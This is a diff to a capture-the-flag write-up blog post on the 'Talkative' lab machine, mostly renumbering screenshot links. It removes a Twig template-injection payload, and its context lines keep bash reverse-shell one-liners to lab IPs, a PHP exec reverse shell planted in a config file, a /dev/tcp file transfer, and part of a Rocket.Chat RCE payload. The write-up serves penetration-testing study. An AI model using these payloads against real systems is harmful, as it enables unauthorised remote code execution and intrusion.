@@ -1,7 +1,7 @@
 ---
 layout: post
 title: "talkative"
-date: 2025-10-13
+date: 2025-10-13 
 categories: OSCP Playlist
 ---
 # talkative
@@ -240,17 +240,11 @@ Now we search for twig, we find the RCE command in **Out of Band Template Inject
 
 Let’s change the command to id to verify:
 
-{% highlight bash %}
-{{['id']|filter('system')}}
-
-OR WEBSHELL
-
-{{app.request.query.filter('cmd',0,1024,{'options':'system'})}}
-{% endhighlight %}
+![image.png]({{ site.baseurl }}/assets/talkative/image%2021.png)
 
 Save changes, and clear the cache, go back to the main page. Searching for id, we find:
 
-![image.png]({{ site.baseurl }}/assets/talkative/image%2021.png)
+![image.png]({{ site.baseurl }}/assets/talkative/image%2022.png)
 
 It works. Let’s get a shell back:
 
@@ -262,7 +256,7 @@ bash -c 'sh -i >& /dev/tcp/10.10.16.9/4444 0>&1'
 
 Save changes, and clear the cache, go back to the main page. We now have shell:
 
-![image.png]({{ site.baseurl }}/assets/talkative/image%2022.png)
+![image.png]({{ site.baseurl }}/assets/talkative/image%2023.png)
 
 Another way is to go to Configuration → All configuration Files, Choose bundles.php:
 
@@ -270,7 +264,7 @@ Another way is to go to Configuration → All configuration Files, Choose bundle
 exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.2/4444 0>&1'");
 ```
 
-![image.png]({{ site.baseurl }}/assets/talkative/image%2023.png)
+![image.png]({{ site.baseurl }}/assets/talkative/image%2024.png)
 
 Save changes. Now refresh the main talkative.php page:
 
@@ -311,7 +305,7 @@ bash -c "cat < /dev/tcp/10.10.16.9/1234 > /tmp/nmap"
 
 After a while, we can close the connection off on our attack host. Verify file integrity with md5sum:
 
-![image.png]({{ site.baseurl }}/assets/talkative/image%2024.png)
+![image.png]({{ site.baseurl }}/assets/talkative/image%2025.png)
 
 Now let’s scan:
 
@@ -382,7 +376,7 @@ script /dev/null -c bash
 
 Now let’s try again; we are logged in:
 
-![image.png]({{ site.baseurl }}/assets/talkative/image%2025.png)
+![image.png]({{ site.baseurl }}/assets/talkative/image%2026.png)
 
 Let’s start default enumeration; we are not part of any privileged groups.
 
@@ -404,7 +398,7 @@ dos2unix exploit.sh
 
 Now transfer the exploit to target and execute it.
 
-![image.png]({{ site.baseurl }}/assets/talkative/image%2026.png)
+![image.png]({{ site.baseurl }}/assets/talkative/image%2027.png)
 
 It gets stuck on buffering. 
 
@@ -426,7 +420,7 @@ Let’s upload pspy and see what cron jobs are running:
 
 It seems like there’s a backup of the shadow file with mongodb. We know mongodb operate over port 27017:
 
-![image.png]({{ site.baseurl }}/assets/talkative/image%2027.png)
+![image.png]({{ site.baseurl }}/assets/talkative/image%2028.png)
 
 However, on the host we are on, we don’t see that port running:
 
@@ -512,7 +506,7 @@ chmod +x chisel
 
 ```
 
-![image.png]({{ site.baseurl }}/assets/talkative/image%2028.png)
+![image.png]({{ site.baseurl }}/assets/talkative/image%2029.png)
 
 Connected. Now let’s search for mongo shell and download from here: [https://www.mongodb.com/try/download/shell](https://www.mongodb.com/try/download/shell)
 
@@ -528,7 +522,7 @@ Now let’s use mongo shell:
 mongosh
 ```
 
-![image.png]({{ site.baseurl }}/assets/talkative/image%2029.png)
+![image.png]({{ site.baseurl }}/assets/talkative/image%2030.png)
 
 We are connected. Now let’s enumerate:
 
@@ -682,9 +676,9 @@ Searching up rocketchat authenticated administrator rce, we find this github pag
 
 http://github.com/CsEnox/CVE-2021-22911
 
-![image.png]({{ site.baseurl }}/assets/talkative/image%2030.png)
-
 ![image.png]({{ site.baseurl }}/assets/talkative/image%2031.png)
+
+![image.png]({{ site.baseurl }}/assets/talkative/image%2032.png)
 
 ```bash
 const require = console.log.constructor('return process.mainModule.require')();
@@ -703,15 +697,15 @@ URL: http://10.10.16.2
 Script Enabled: True
 ```
 
-![image.png]({{ site.baseurl }}/assets/talkative/image%2032.png)
+![image.png]({{ site.baseurl }}/assets/talkative/image%2033.png)
 
 Now save changes. Now go back to rocket chat, let’s leave room. 
 
-![image.png]({{ site.baseurl }}/assets/talkative/image%2033.png)
+![image.png]({{ site.baseurl }}/assets/talkative/image%2034.png)
 
 We now have shell:
 
-![image.png]({{ site.baseurl }}/assets/talkative/image%2034.png)
+![image.png]({{ site.baseurl }}/assets/talkative/image%2035.png)
 
 Since we are already root on the container, our goal now is to break out the container.
 
@@ -805,4 +799,4 @@ chmod +x shocker
 
 We now have flag:
 
-![image.png]({{ site.baseurl }}/assets/talkative/image%2035.png)
+![image.png]({{ site.baseurl }}/assets/talkative/image%2036.png)
